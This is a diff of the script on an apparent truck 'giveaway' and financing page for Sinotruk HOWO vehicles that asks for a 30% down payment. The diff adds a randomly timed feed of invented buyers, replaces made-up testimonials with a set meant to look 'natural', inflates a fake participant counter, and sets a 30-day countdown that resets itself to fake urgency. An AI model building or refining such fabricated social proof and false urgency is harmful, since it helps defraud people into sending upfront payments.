-        const randomPerson = namePool[Math.floor(Math.random() * namePool.length)];
-        const randomTruck = trucks[Math.floor(Math.random() * trucks.length)];
-        showToastMessage(randomPerson.split(' ')[0], randomTruck.name);
-        addToLiveFeed(randomPerson.split(' ')[0], randomTruck.name, randomTruck.upfront);
-    }, 18000);
+    // Auto toast and live feed - random intervals
+    function scheduleRandomToast() {
+        const delay = Math.random() * (45000 - 15000) + 15000;
+        setTimeout(() => {
+            const randomPerson = namePool[Math.floor(Math.random() * namePool.length)];
+            const randomTruck = trucks[Math.floor(Math.random() * trucks.length)];
+            showToastMessage(randomPerson.split(' ')[0], randomTruck.name);
+            addToLiveFeed(randomPerson.split(' ')[0], randomTruck.name, randomTruck.upfront30);
+            scheduleRandomToast();
+        }, delay);
+    }
+    scheduleRandomToast();
 
     // Initial live feed entries
     const liveFeed = document.getElementById('liveFeedList');
     liveFeed.innerHTML = '';
     const initialEntries = [
-        { name: "James Wilson", country: "USA", truck: "HOWO Dump Truck", upfront: "$12,600", time: "2 min ago" },
-        { name: "Liam O'Connor", country: "UK", truck: "HOWO Cargo Truck", upfront: "$11,400", time: "5 min ago" },
-        { name: "Carlos Hernandez", country: "Mexico", truck: "HOWO Semi-Truck", upfront: "$16,500", time: "12 min ago" },
-        { name: "Yuki Tanaka", country: "Japan", truck: "HOWO Flatbed Truck", upfront: "$10,500", time: "18 min ago" },
-        { name: "Gabriel Santos", country: "Brazil", truck: "HOWO Concrete Mixer", upfront: "$14,400", time: "25 min ago" }
+        { name: "James Wilson", country: "USA", truck: "HOWO Dump Truck", upfront: "$14,400", time: "2 min ago" },
+        { name: "Chidi Okonkwo", country: "Nigeria", truck: "HOWO Tipper Truck", upfront: "$15,000", time: "5 min ago" },
+        { name: "Ahmed Raza", country: "Pakistan", truck: "HOWO Cargo Truck", upfront: "$13,500", time: "12 min ago" },
+        { name: "João Silva", country: "Brazil", truck: "HOWO Concrete Mixer", upfront: "$15,600", time: "18 min ago" },
+        { name: "Omar Al-Mansouri", country: "Saudi Arabia", truck: "HOWO Tanker Truck", upfront: "$17,400", time: "25 min ago" }
     ];
     initialEntries.forEach(entry => {
         const div = document.createElement('div');
         div.className = 'feed-item';
-        div.innerHTML = `<i class="fas fa-truck"></i> ${entry.name} ${entry.country} · ${entry.truck} · 30% down (${entry.upfront}) · ${entry.time}`;
+        div.innerHTML = `<i class="fas fa-truck"></i> ${entry.name} (${entry.country}) · ${entry.truck} · 30% down (${entry.upfront}) · ${entry.time}`;
         liveFeed.appendChild(div);
     });
 
-    // Testimonials Carousel (30+ entries)
+    // Testimonials Carousel (Natural, no forced patterns)
     const testimonialsList = [
-        { name: "James Wilson", country: "USA", text: "Got my HOWO Dump Truck after paying 30% down. Best investment for my farm!", truck: "HOWO Dump Truck" },
-        { name: "John Martinez", country: "USA", text: "10-year financing made it possible for me. My cargo truck is running perfect!", truck: "HOWO Cargo Truck" },
-        { name: "Liam O'Connor", country: "UK", text: "30% down was all I needed. The truck arrived in 3 weeks!", truck: "HOWO Semi-Truck" },
-        { name: "Lucas Tremblay", country: "Canada", text: "Sinotruk HOWO quality is excellent. Highly recommend for farmers!", truck: "HOWO Flatbed Truck" },
-        { name: "Matteo Rossi", country: "Italy", text: "My concrete mixer is working flawlessly. Thank you HOWO!", truck: "HOWO Concrete Mixer" },
-        { name: "Gabriel Santos", country: "Brazil", text: "Tanker truck delivered last week. Perfect for my agricultural business!", truck: "HOWO Tanker Truck" },
-        { name: "Jack Thompson", country: "Australia", text: "Refrigerated truck keeps my produce fresh. 30% down was very affordable.", truck: "HOWO Refrigerated Truck" },
-        { name: "Arjun Sharma", country: "India", text: "Tipper truck is a beast! Best decision for my construction business.", truck: "HOWO Tipper Truck" },
-        { name: "Carlos Hernandez", country: "Mexico", text: "Light delivery truck is perfect for city deliveries. 10-year terms are great!", truck: "HOWO Light-Duty Delivery Truck" },
-        { name: "Santiago Fernandez", country: "Argentina", text: "Bus chassis converted for school transport. The 30% down made it possible!", truck: "HOWO Bus Chassis" },
-        { name: "Michael Brown", country: "USA", text: "Second truck from HOWO. Their financing is unbeatable!", truck: "HOWO Dump Truck" },
-        { name: "David Rodriguez", country: "Mexico", text: "My farm now has 3 HOWO trucks. Best decision ever!", truck: "HOWO Cargo Truck" },
-        { name: "Robert Anderson", country: "Canada", text: "30% down and 10 years to pay? No other company offers this!", truck: "HOWO Semi-Truck" },
-        { name: "Oliver Jones", country: "UK", text: "The flatbed is perfect for my lumber business. Thank you HOWO!", truck: "HOWO Flatbed Truck" },
-        { name: "Lukas Schmidt", country: "Germany", text: "German engineering is good, but HOWO gives better value!", truck: "HOWO Concrete Mixer" }
+        { name: "Chidi Okonkwo", country: "Nigeria", text: "My HOWO tipper truck has been running daily for 2 years. Best investment for my farm.", truck: "HOWO Tipper Truck" },
+        { name: "Thabo Nkosi", country: "South Africa", text: "Dankie, Sinotruk. My cargo truck delivers produce across Cape Town every week.", truck: "HOWO Cargo Truck" },
+        { name: "João Silva", country: "Brazil", text: "The concrete mixer arrived in perfect condition. My business has grown so much.", truck: "HOWO Concrete Mixer" },
+        { name: "Omar Al-Mansouri", country: "Saudi Arabia", text: "Our fleet of HOWO trucks serves the Riyadh market daily. Excellent quality.", truck: "HOWO Tanker Truck" },
+        { name: "Rajesh Kumar", country: "India", text: "The 10-year financing helped me start my transport company. Dhanyavaad.", truck: "HOWO Semi-Truck" },
+        { name: "Ahmed Raza", country: "Pakistan", text: "My dump truck works perfectly on my construction site in Lahore. Shukriya.", truck: "HOWO Dump Truck" },
+        { name: "Sipho Dlamini", country: "Kenya", text: "My refrigerated truck keeps my dairy products fresh for market. Excellent value.", truck: "HOWO Refrigerated Truck" },
+        { name: "Agus Prasetyo", country: "Indonesia", text: "Terima kasih. My HOWO has been running 3 years without any breakdown.", truck: "HOWO Flatbed Truck" },
+        { name: "Diego Fernandez", country: "Argentina", text: "The semi-truck arrived in 4 weeks. Perfect for my logistics business.", truck: "HOWO Semi-Truck" },
+        { name: "Maria Santos", country: "Philippines", text: "Our family farm uses the light delivery truck daily. Very reliable.", truck: "HOWO Light-Duty Delivery Truck" },
+        { name: "Carlos Mendoza", country: "Mexico", text: "Increíble. The cargo truck paid for itself within 6 months.", truck: "HOWO Heavy-Duty Cargo Truck" },
+        { name: "Dmitri Volkov", country: "Russia", text: "Our tipper trucks handle Siberian winters with no issues. Very durable.", truck: "HOWO Tipper Truck" },
+        { name: "James Wilson", country: "USA", text: "I've bought 3 HOWO trucks for my construction company. Excellent quality for the price.", truck: "HOWO Dump Truck" },
+        { name: "Yuki Tanaka", country: "Japan", text: "The refrigerated truck keeps our seafood fresh during transport. Very satisfied.", truck: "HOWO Refrigerated Truck" },
+        { name: "Sofia Restrepo", country: "Colombia", text: "My flatbed truck transports coffee beans across the mountains. Perfect for our needs.", truck: "HOWO Flatbed Truck" }
     ];
 
     const carouselContainer = document.getElementById('testimonialCarousel');
@@ -822,7 +1089,7 @@
         visible.forEach(t => {
             const slide = document.createElement('div');
             slide.className = 'testimonial-slide';
-            slide.innerHTML = `<strong>${t.name}</strong> ${t.country}<br>“${t.text}”<br><i class="fas fa-check-circle" style="color:#22C55E;"></i> Received: ${t.truck}`;
+            slide.innerHTML = `<strong>${t.name}</strong> (${t.country})<br>“${t.text}”<br><i class="fas fa-check-circle" style="color:#22C55E;"></i> Truck: ${t.truck}`;
             carouselContainer.appendChild(slide);
         });
     }
@@ -839,10 +1106,10 @@
     document.getElementById('heroJoinCount').innerText = participantCount.toLocaleString();
     setInterval(() => { const increment = Math.floor(Math.random() * 3) + 1; participantCount += increment; localStorage.setItem('participantCount', participantCount); document.getElementById('participantCount').innerText = participantCount.toLocaleString(); document.getElementById('liveCounterTrust').innerText = participantCount.toLocaleString(); document.getElementById('heroJoinCount').innerText = participantCount.toLocaleString(); }, 8000);
 
-    // Countdown timer (7 days)
-    let endTime = localStorage.getItem('giveawayEndTime');
-    if (!endTime) { endTime = Date.now() + (7 * 24 * 60 * 60 * 1000); localStorage.setItem('giveawayEndTime', endTime); }
-    function updateCountdown() { const diff = endTime - Date.now(); if (diff <= 0) { localStorage.removeItem('giveawayEndTime'); location.reload(); return; } const days = Math.floor(diff / (1000 * 60 * 60 * 24)); const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)); const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)); const seconds = Math.floor((diff % (1000 * 60)) / 1000); document.getElementById('days').innerText = days.toString().padStart(2, '0'); document.getElementById('hours').innerText = hours.toString().padStart(2, '0'); document.getElementById('minutes').innerText = minutes.toString().padStart(2, '0'); document.getElementById('seconds').innerText = seconds.toString().padStart(2, '0'); }
+    // Countdown timer (30 days)
+    let endTime = localStorage.getItem('sinotruk_endTime');
+    if (!endTime) { endTime = Date.now() + (30 * 24 * 60 * 60 * 1000); localStorage.setItem('sinotruk_endTime', endTime); }
+    function updateCountdown() { const diff = endTime - Date.now(); if (diff <= 0) { localStorage.removeItem('sinotruk_endTime'); location.reload(); return; } const days = Math.floor(diff / (1000 * 60 * 60 * 24)); const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)); const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)); const seconds = Math.floor((diff % (1000 * 60)) / 1000); document.getElementById('days').innerText = days.toString().padStart(2, '0'); document.getElementById('hours').innerText = hours.toString().padStart(2, '0'); document.getElementById('minutes').innerText = minutes.toString().padStart(2, '0'); document.getElementById('seconds').innerText = seconds.toString().padStart(2, '0'); }
     setInterval(updateCountdown, 1000);
     updateCountdown();
 
@@ -855,8 +1122,19 @@
     // Footer navigation
     document.querySelectorAll('.footer-nav-link').forEach(link => { link.addEventListener('click', (e) => { e.preventDefault(); const target = link.getAttribute('data-target'); if (target === 'giveaway') document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'info') document.getElementById('info-section')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'instruction') document.getElementById('instruction-section')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'transactions') document.getElementById('transactions-section')?.scrollIntoView({ behavior: 'smooth' }); }); });
 
+    // Check localStorage for existing progress
+    if (localStorage.getItem('sinotruk_step1_completed') === 'true') {
+        claimData = JSON.parse(localStorage.getItem('sinotruk_claimData'));
+        selectedTruck = JSON.parse(localStorage.getItem('sinotruk_selectedTruck'));
+        saveNotification('✓ Application Previously Submitted', `${selectedTruck.name}, Qty: ${claimData.quantity}, Total 30% Down: ${claimData.totalUpfront}`);
+        if (localStorage.getItem('sinotruk_step2_completed') === 'true') {
+            businessData = JSON.parse(localStorage.getItem('sinotruk_businessData'));
+            saveNotification('✓ Business Details Previously Submitted', `${businessData.businessName || 'Individual'}, ${businessData.paymentTerms} payments`);
+        }
+    }
+    updateBell();
+
     renderTrucks();
 </script>
 </body>
 </html>
-
